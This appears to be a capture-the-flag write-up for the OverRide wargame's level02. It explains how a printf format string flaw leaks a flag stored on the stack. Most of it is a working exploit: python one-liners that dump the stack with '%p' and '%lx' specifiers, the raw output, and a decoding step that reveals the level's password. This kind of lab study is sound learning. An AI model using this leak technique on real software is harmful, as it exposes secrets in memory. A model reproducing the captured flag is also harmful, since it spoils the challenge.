# Format String Exploit

see source.c

## Analysis

First 64bit elf file !
For this one we instantly notice a format string exploit because of the call of printf with a variable. We also notice that the flag is on the stack inside the variable 'flag' so we could just print all the stack and hopefully see our flag !
First thing to do is locate the flag bytes on the stack, so the first thing we did was to print 'B' as password since the flag is located after the password input on the stack. Then just print everything as hexa and translate bytes into char to get the flag !

(another way to do this is to get the pointer of flag and set it on B, then print '%s' on the flag pointer.)

```
level02@OverRide:~$ (python -c "print('%p.' * 20 + '%lx %lx %lx %lx %lx %lx')"; python -c "print('B' * 100)") | $PWD/level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4c0.(nil).0x42.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6b8.0x1f7ff9a08.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x4242424242424242.0x100424242.0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!
level02@OverRide:~$ echo -e '\x48\x68\x37\x34\x52\x50\x6e\x75\x51\x39\x73\x61\x35\x4a\x41\x45\x58\x67\x4e\x57\x43\x71\x7a\x37\x73\x58\x47\x6e\x68\x35\x4a\x35\x4d\x39\x4b\x66\x50\x67\x33\x48'
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
